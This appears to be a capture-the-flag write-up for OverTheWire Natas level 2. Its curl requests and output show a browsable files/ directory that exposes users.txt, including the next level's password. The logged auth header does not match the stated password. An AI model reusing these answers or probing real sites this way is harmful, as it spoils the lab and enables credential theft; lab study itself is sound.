### natas2 pswd: vsDOxoXyq3wckCP1ZmTZ71ngIA606odB

```bash
curl -v -s -c cookie.txt -X POST http://natas2:vsDOxoXyq3wckCP1ZmTZ71ngIA606odB@natas2.natas.labs.overthewire.org

# <h1>natas2</h1>
# <div id="content">
# There is nothing on this page
# <img src="files/pixel.png">
# </div>
# 
```

There is a `files/pixel.png`.
Let's have a look, maybe we discover something else in the `files` directory.

```bash
curl -v -s  http://natas2:vsDOxoXyq3wckCP1ZmTZ71ngIA606odB@natas2.natas.labs.overthewire.org/files/ 
# * Host natas2.natas.labs.overthewire.org:80 was resolved.
# * IPv6: (none)
# * IPv4: 13.53.215.123
# *   Trying 13.53.215.123:80...
# * Established connection to natas2.natas.labs.overthewire.org (13.53.215.123 port 80) from # 10.0.2.15 port 35328 
# * using HTTP/1.x
# * Server auth using Basic with user 'natas2'
# > GET /files/ HTTP/1.1
# > Host: natas2.natas.labs.overthewire.org
# > Authorization: Basic bmF0YXMyOlRndU1OeEtvMURTYTF0dWpCTHVaSm5EVWxDY1VBUGxJ
# > User-Agent: curl/8.19.0
# > Accept: */*
# > 
# * Request completely sent off
# < HTTP/1.1 200 OK
# < Date: Fri, 19 Jun 2026 18:22:20 GMT
# < Server: Apache/2.4.58 (Ubuntu)
# < Vary: Accept-Encoding
# < Content-Length: 1154
# < Content-Type: text/html;charset=UTF-8
# < 
# <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
# <html>
#  <head>
#   <title>Index of /files</title>
#  </head>
#  <body>
# <h1>Index of /files</h1>
#   <table>
#    <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;# O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;# O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
#    <tr><th colspan="5"><hr></th></tr>
# <tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/# ">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
# <tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="pixel.# png">pixel.png</a></td><td align="right">2026-06-14 17:38  </td><td align="right">303 </td><td>&nbsp;</td></tr>
 <tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="users.txt">users.txt</a></td><td align="right">2026-06-14 17:38  </td><td align="right">145 </td><td>&nbsp;</td></tr>
#    <tr><th colspan="5"><hr></th></tr>
# </table>
# <address>Apache/2.4.58 (Ubuntu) Server at natas2.natas.labs.overthewire.org Port 80</# address>
# </body></html>
# * Connection #0 to host natas2.natas.labs.overthewire.org:80 left intact
# 
```

That file `users.txt` looks interesting, let's have a look.

```bash
curl -v -s  http://natas2:vsDOxoXyq3wckCP1ZmTZ71ngIA606odB@natas2.natas.labs.overthewire.org/files/users.txt
# * Host natas2.natas.labs.overthewire.org:80 was resolved.
# * IPv6: (none)
# * IPv4: 13.53.215.123
# *   Trying 13.53.215.123:80...
# * Established connection to natas2.natas.labs.overthewire.org (13.53.215.123 port 80) from 10.0.2.15 port 58232 
# * using HTTP/1.x
# * Server auth using Basic with user 'natas2'
# > GET /files/users.txt HTTP/1.1
# > Host: natas2.natas.labs.overthewire.org
# > Authorization: Basic bmF0YXMyOlRndU1OeEtvMURTYTF0dWpCTHVaSm5EVWxDY1VBUGxJ
# > User-Agent: curl/8.19.0
# > Accept: */*
# > 
# * Request completely sent off
# < HTTP/1.1 200 OK
# < Date: Fri, 19 Jun 2026 18:27:40 GMT
# < Server: Apache/2.4.58 (Ubuntu)
# < Last-Modified: Sun, 14 Jun 2026 17:38:50 GMT
# < ETag: "91-6543a2ecfdc1d"
# < Accept-Ranges: bytes
# < Content-Length: 145
# < Vary: Accept-Encoding
# < Content-Type: text/plain
# < 
# # username:password
# alice:BYNdCesZqW
# bob:jw2ueICLvT
# charlie:G5vCxkVV3m
natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI
# eve:zo4mJWyNj2
# mallory:9urtcpzBmH
# * Connection #0 to host natas2.natas.labs.overthewire.org:80 left intact
```

browsing for `/files/users.txt` from firefox we're getting the same

```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```